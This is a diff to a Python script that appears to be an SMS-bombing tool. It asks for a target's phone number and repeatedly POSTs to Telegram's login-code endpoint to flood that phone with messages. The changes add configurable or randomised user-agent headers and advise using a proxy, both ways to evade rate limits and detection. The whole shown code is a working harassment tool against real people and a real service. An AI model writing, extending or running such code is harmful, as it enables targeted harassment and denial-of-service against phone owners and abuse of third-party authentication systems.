@@ -3,16 +3,34 @@ from banners import *
 from formats import *
 import requests
 import random
+import json
 import fake_useragent
 import time
 
-with open("male_names_rus.txt", "r", encoding="UTF-8") as f:
+with (open("male_names_rus.txt", "r", encoding="UTF-8") as f,
+      open("usernames_gmail.com.txt", "r", encoding="UTF-8") as f2,
+      open("cfg.json", "r", encoding="UTF-8") as config):
     names = f.read().splitlines()
-with open("usernames_gmail.com.txt", "r", encoding="UTF-8") as f:
-    emails = f.read().splitlines()
+    emails = f2.read().splitlines()
+    cfg = json.load(config)
 
+if cfg["custom-headers"] == "":
+    print("Would you like to use a custom headers? You can change it whenever you want in cfg.json file.\n"
+          "Leave it empty, if you want to use random headers.")
+    a = input("Headers (leave empty for random): ")
+    if a == "":
+        cfg["custom-headers"] = "random"
+    else:
+        cfg["custom-headers"] = a
+    with open("cfg.json", "w", encoding="UTF-8") as config:
+        json.dump(cfg, config, indent=4)
+    del a
+
+with open("cfg.json", "r", encoding="UTF-8") as config:
+    cfg = json.load(config)
 while True:
     bomb16()
+    print("it's better to use proxy")
 
     while True:
         NUMBER = input("Phone number (+79000000000 format): ")
@@ -32,9 +50,11 @@ while True:
 
     for i in range(RANGE):
         print(f"Starting cycle {i}")
-        user = fake_useragent.UserAgent().random
-        HEADERS = {'user_agent': user}
-        print(f"{user} was selected as headers for this cycle")
+        if cfg["custom-headers"] == "random" or cfg["custom-headers"] == "":
+            HEADERS = {'user_agent': fake_useragent.UserAgent().random}
+            print(f"{HEADERS['user_agent']} was selected as headers for this cycle")
+        else:
+            HEADERS = {'user_agent': cfg["custom-headers"]}
         try:
             response = requests.post('https://my.telegram.org/auth/send_password',
                                      headers=HEADERS, data={'phone': NUMBER}, timeout=5.05)
